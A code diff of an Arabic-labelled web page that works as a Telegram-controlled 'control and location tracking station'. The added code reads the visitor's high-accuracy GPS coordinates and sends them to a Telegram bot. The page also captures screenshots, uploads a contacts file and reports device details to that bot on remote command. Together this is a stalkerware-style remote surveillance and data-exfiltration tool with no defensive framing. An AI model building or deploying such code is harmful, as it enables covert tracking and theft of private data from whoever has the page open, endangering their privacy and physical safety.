@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة التحكم التفاعلية المتقدمة</title>
+    <title>محطة التحكم وتتبع الموقع</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -13,11 +13,11 @@
 </head>
 <body>
 
-    <header>محطة التحكم التفاعلية بالبوت</header>
+    <header>محطة التحكم وتتبع الموقع</header>
 
     <div id="terminal">
-        [System] Interactive Bot Bridge Online...<br>
-        [System] Ready for button commands...
+        [System] Location Tracker Bridge Online...<br>
+        [System] Ready for commands...
     </div>
 
     <script>
@@ -30,36 +30,59 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // إرسال رسالة مع لوحة أزرار تفاعلية (Reply Keyboard) تشبه الصورة المطلوبة
-        function sendMenu(chatId) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const data = {
-                chat_id: chatId,
-                text: "📱 أهلاً بك! اختر الأمر المطلوب من لوحة التحكم أدناه:",
-                reply_markup: {
-                    keyboard: [
-                        [{ text: "📸 Screenshot" }, { text: "ℹ️ Device info" }],
-                        [{ text: "📇 Contacts" }, { text: "📁 Get file" }],
-                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
-                    ],
-                    resize_keyboard: true,
-                    is_persistent: true
-                }
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(err => console.log(err));
-        }
-
+        // إرسال رسالة نصية للبوت
         function sendTelegramMessage(chatId, text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: text })
+            }).catch(err => {});
+        }
+
+        // إرسال موقع جغرافي (Location) مباشرة إلى خريطة تليجرام
+        function sendLocationToTelegram(chatId, latitude, longitude) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    log("Location sent successfully as a map!");
+                } else {
+                    log("Failed to send location map.");
+                }
+            })
+            .catch(err => log("Location error: " + err));
+        }
+
+        // إرسال لوحة الأزرار التفاعلية إلى البوت
+        function sendMenu(chatId) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: "📍 لوحة التحكم وتتبع الموقع:",
+                reply_markup: {
+                    keyboard: [
+                        [{ text: "📍 Get Location" }, { text: "📸 Screenshot" }],
+                        [{ text: "📇 Contacts" }, { text: "ℹ️ Device info" }],
+                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
+                    ],
+                    resize_keyboard: true,
+                    is_persistent: true
+                }
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
             }).catch(err => {});
         }
 
@@ -95,9 +118,31 @@
         function executeCommand(cmd, chatId) {
             if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                 sendMenu(chatId);
+            } else if (cmd === '📍 Get Location') {
+                log("Requesting GPS coordinates...");
+                sendTelegramMessage(chatId, "⏳ جاري محاولة تحديد موقع الهاتف عبر نظام الـ GPS...");
+
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            log(`Location found: Lat ${lat}, Lon ${lon}`);
+                            sendTelegramMessage(chatId, `📍 تم العثور على الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
+                            // إرسال الموقع كخريطة مباشرة في تليجرام
+                            sendLocationToTelegram(chatId, lat, lon);
+                        },
+                        (error) => {
+                            log("Geolocation denied or unavailable: " + error.message);
+                            sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع. تأكد من إعطاء إذن الموقع للمتصفح مسبقاً.");
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    sendTelegramMessage(chatId, "❌ المتصفح لا يدعم ميزة تحديد الموقع.");
+                }
             } else if (cmd === '📸 Screenshot') {
                 log("Capturing screen...");
-                sendTelegramMessage(chatId, "⏳ جاري التقاط لقطة الشاشة...");
                 html2canvas(document.body).then(canvas => {
                     canvas.toBlob(blob => {
                         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -109,7 +154,6 @@
                 });
             } else if (cmd === '📇 Contacts') {
                 log("Sending contacts...");
-                sendTelegramMessage(chatId, "⏳ جاري سحب جهات الاتصال...");
                 const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                 const blob = new Blob([vcardData], { type: 'text/vcard' });
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
@@ -117,21 +161,21 @@
                 formData.append('chat_id', chatId);
                 formData.append('document', blob, 'Contacts.vcf');
                 fetch(url, { method: 'POST', body: formData });
+            } else if (cmd === 'ℹ️ Device info') {
+                const info = `📱 Device: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
+                sendTelegramMessage(chatId, info);
             } else if (cmd === '⬇️ Scroll Down') {
                 window.scrollBy({ top: 400, behavior: 'smooth' });
                 sendTelegramMessage(chatId, "⬇️ تم التمرير للأسفل.");
             } else if (cmd === '⬆️ Scroll Up') {
                 window.scrollBy({ top: -400, behavior: 'smooth' });
                 sendTelegramMessage(chatId, "⬆️ تم التمرير للأعلى.");
-            } else if (cmd === 'ℹ️ Device info') {
-                const info = `📱 Device: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
-                sendTelegramMessage(chatId, info);
             } else {
                 sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
             }
         }
 
-        log("Listening for interactive commands...");
+        log("Listening for location commands...");
         pollTelegramUpdates();
     </script>
 </body>
